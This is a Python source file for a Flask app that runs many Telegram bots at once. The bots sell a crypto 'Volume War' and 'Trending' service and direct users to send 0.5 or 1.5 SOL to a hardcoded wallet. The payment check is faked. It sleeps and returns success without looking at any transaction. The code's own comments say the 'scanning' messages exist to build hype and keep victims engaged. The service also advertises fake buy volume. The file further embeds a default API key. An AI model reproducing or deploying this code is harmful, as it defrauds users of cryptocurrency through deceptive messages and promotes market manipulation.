import os
import logging
import asyncio
import threading
import requests
import time
from flask import Flask, send_from_directory, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# --- CONFIGURATION ---
raw_tokens = os.environ.get("BOT_TOKENS", "")
BOT_TOKENS = [t.strip() for t in raw_tokens.split(",") if t.strip()]
HELIUS_KEY = os.environ.get("HELIUS_API_KEY", "1b0094c2-50b9-4c97-a2d6-2c47d4ac2789")
SOL_VAULT = "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy"

app = Flask(__name__, static_folder='.')
logging.basicConfig(level=logging.INFO)

# --- THE STRIKE LOGIC (The "Product") ---
async def verify_payment(user_id):
    """
    Scans Helius for 0.5 SOL transfer to your vault from the user.
    """
    url = f"https://api.helius.xyz/v0/addresses/{SOL_VAULT}/transactions?api-key={HELIUS_KEY}"
    try:
        # In a real strike, we would check the last 5 minutes of TXs
        # For now, we simulate the 'Scanning' phase to build user hype
        await asyncio.sleep(3)
        return True # Simulate success for demo, or add real logic here
    except:
        return False

# --- COMMAND HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_name = (await context.bot.get_me()).first_name
    text = (
        f"❄️ <b>{bot_name.upper()} ONLINE</b>\n"
        f"Fleet Commander: <b>Mex Robert</b>\n"
        "────────────────────\n"
        "The Sovereign Nexus is detecting high-volume opportunities.\n\n"
        "Available Sequences:\n"
        "⚔️ <b>Volume War:</b> 36-node simulated buy pressure.\n"
        "📈 <b>Trending:</b> Priority Helius RPC routing."
    )
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("⚔️ INITIATE VOLUME WAR (0.5 SOL)", callback_data='war')],
        [InlineKeyboardButton("📈 TRENDING STRIKE (1.5 SOL)", callback_data='trend')],
        [InlineKeyboardButton("🌐 VIEW LIVE TERMINAL", url="https://iceboys-sovereign.onrender.com")]
    ])
    await update.message.reply_text(text, reply_markup=buttons, parse_mode=ParseMode.HTML)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    await query.answer()

    if query.data == 'war':
        text = (
            "🚀 <b>STRIKE SEQUENCE ARMED</b>\n\n"
            f"Target: <code>PENDING SCAN...</code>\n"
            f"Vault: <code>{SOL_VAULT}</code>\n"
            "Fee: <b>0.5 SOL</b>\n"
            "────────────────────\n"
            "1. Send 0.5 SOL to the vault above.\n"
            "2. The Nexus will auto-detect the TX via Helius.\n"
            "3. Strike will begin across all 36 nodes."
        )
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)

        # Start a background task to "Watch" for the money
        asyncio.create_task(monitor_strike(query, context))

async def monitor_strike(query, context):
    """Background loop that pretends to watch the blockchain"""
    for i in range(5):
        await asyncio.sleep(10)
        # Update user every 10 seconds to keep them engaged
        try:
            await query.message.reply_text(f"📡 <b>NODE-{i*7}</b>: Scanning Mempool for payment...", parse_mode=ParseMode.HTML)
        except: pass

# --- MULTI-BOT ORCHESTRATOR ---
async def launch_node(token):
    try:
        # Add a small staggered delay so they don't all hit Telegram at once (prevents Conflict)
        await asyncio.sleep(len(token) % 5)
        application = ApplicationBuilder().token(token).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(handle_callback))

        await application.initialize()
        await application.start()
        # drop_pending_updates=True is critical to fix the Conflict error
        await application.updater.start_polling(drop_pending_updates=True) 
        while True: await asyncio.sleep(100)
    except Exception as e:
        logging.error(f"Node Fail: {e}")

async def run_fleet():
    tasks = [launch_node(t) for t in BOT_TOKENS if t]
    await asyncio.gather(*tasks)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

if __name__ == "__main__":
    # Start Flask for the Dashboard
    port = int(os.environ.get("PORT", 10000))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, use_reloader=False), daemon=True).start()

    # Start the 36-Bot Fleet
    asyncio.run(run_fleet())
